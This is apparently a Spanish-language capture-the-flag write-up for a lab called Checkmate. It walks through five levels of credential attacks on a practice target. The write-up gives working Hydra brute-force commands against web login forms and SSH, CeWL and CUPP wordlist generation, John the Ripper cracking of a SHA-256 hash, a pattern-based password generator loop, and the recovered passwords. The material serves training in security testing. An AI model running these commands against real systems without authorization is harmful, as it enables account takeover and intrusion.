# Checkmate

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Resolver los cinco niveles de una aplicación web mediante distintas técnicas de ataque relacionadas con la obtención de credenciales, incluyendo **fuerza bruta**, **creación de diccionarios personalizados**, **crackeo de hashes** y acceso final al sistema mediante **SSH**.

---

## 🛠️ Tecnologías trabajadas

- Hydra
- CeWL
- CUPP
- John The Ripper
- SHA-256
- SSH
- Wordlists personalizadas
- Fuerza bruta sobre formularios web

---

## 🧠 Metodología

La enumeración inicial mostró varios servicios web independientes, cada uno asociado a una fase distinta del laboratorio. En lugar de buscar una vulnerabilidad clásica, el objetivo consistía en resolver una serie de retos relacionados con la obtención de credenciales.

Cada nivel introducía una técnica diferente: desde el uso de credenciales por defecto hasta la creación de diccionarios personalizados con **CeWL** y **CUPP**, el crackeo de hashes **SHA-256** y la generación de contraseñas siguiendo patrones conocidos.

La resolución de cada reto proporcionaba la información necesaria para continuar con el siguiente nivel, finalizando con la obtención de unas credenciales válidas para acceder al sistema mediante **SSH**.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé realizando un reconocimiento con **ReconX**.

Los servicios detectados fueron:

| Puerto | Servicio |
|---------|----------|
| 22 | SSH |
| 5000 | Aplicación principal |
| 5001 | Panel de login |
| 5002 | Panel de login |
| 5003 | Panel de login |

El puerto **5000** contenía el laboratorio principal, formado por cinco niveles independientes.

---

### 2. Nivel 1 — Credenciales por defecto

La primera pista indicaba que el usuario utilizaba unas credenciales predeterminadas.

Se asumió como usuario:

```text
admin
```

El ataque se realizó mediante Hydra sobre el formulario web.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.128.175.94 -s 5001 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials." -V -f
```

Resultado:

```text
admin:12345
```

Con ello quedó completado el primer nivel.

---

### 3. Nivel 2 — Wordlist personalizada con CeWL

La siguiente pista indicaba que la contraseña estaba formada por palabras habituales utilizadas dentro de la empresa.

El usuario ya era conocido.

```text
marco
```

Generé una wordlist personalizada utilizando **CeWL**.

```bash
cewl http://10.128.175.94:5002/ -w company.txt
```

Posteriormente lancé Hydra utilizando dicha lista.

```bash
hydra -l marco -P company.txt 10.128.175.94 -s 5002 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials." -V -f
```

Resultado:

```text
marco:excellence
```

Segundo nivel completado.

---

### 4. Nivel 3 — Contraseña basada en información personal

La siguiente pista indicaba que la contraseña estaba relacionada con información personal del usuario **Marco**.

Utilicé **CUPP** para generar automáticamente un diccionario personalizado a partir de los datos recopilados durante el laboratorio.

Una vez generado el diccionario lancé nuevamente Hydra.

```bash
hydra -l marco -P marco.txt 10.128.175.94 -s 5003 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials." -V -f
```

Resultado:

```text
marco:Bianchi2495
```

Con ello se completó el tercer nivel.

---

### 5. Nivel 4 — Crackeo de un hash SHA-256

Tras acceder al panel correspondiente apareció una pista indicando que Marco había cambiado recientemente su fotografía de perfil.

La aplicación almacenaba dicha información mediante un hash **SHA-256**.

Guardé el hash y utilicé **John The Ripper**.

```bash
john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Resultado:

```text
family
```

Con esta contraseña se resolvió el cuarto nivel.

---

### 6. Nivel 5 — Generación de contraseñas mediante patrones

La última pista indicaba que la contraseña SSH seguía un formato concreto.

Durante la enumeración aparecieron varias palabras clave utilizadas por la empresa.

```text
security
excellence
innovation
digital
cloud
```

El patrón era:

- Palabra clave.
- Primera letra en mayúscula.
- Año.
- Signo de exclamación.

Generé automáticamente un diccionario siguiendo dicho formato.

```bash
for k in security excellence innovation digital cloud; do
    for y in 2022 2023 2024 2025; do
        printf '%s\n' ${(C)k}$y!
    done
done > ssh_words.txt
```

Posteriormente lancé Hydra contra el servicio SSH.

```bash
hydra -l marco -P ssh_words.txt ssh://10.128.175.94
```

Resultado:

```text
marco:Security2024!
```

Con ello quedó resuelto el último nivel del laboratorio.

---

### 7. Acceso final

Utilicé las credenciales obtenidas para acceder mediante SSH.

```bash
ssh marco@10.128.175.94
```

Contraseña:

```text
Security2024!
```

Se obtuvo acceso completo al sistema.

---

## 📚 Lecciones aprendidas

-Este laboratorio permitió practicar diferentes técnicas de obtención de credenciales, demostrando que no siempre es necesario explotar vulnerabilidades complejas para comprometer un sistema.
- Realizar ataques de fuerza bruta contra formularios web utilizando **Hydra**.
- Crear diccionarios personalizados mediante **CeWL**.
- Generar wordlists basadas en información personal utilizando **CUPP**.
- Adaptar diccionarios según el contexto del objetivo.
- Crackear hashes **SHA-256** con **John The Ripper**.
- Generar automáticamente contraseñas siguiendo patrones conocidos.
- Combinar información obtenida durante distintas fases para construir nuevos vectores de ataque.
- Acceder a un sistema mediante **SSH** reutilizando las credenciales descubiertas.
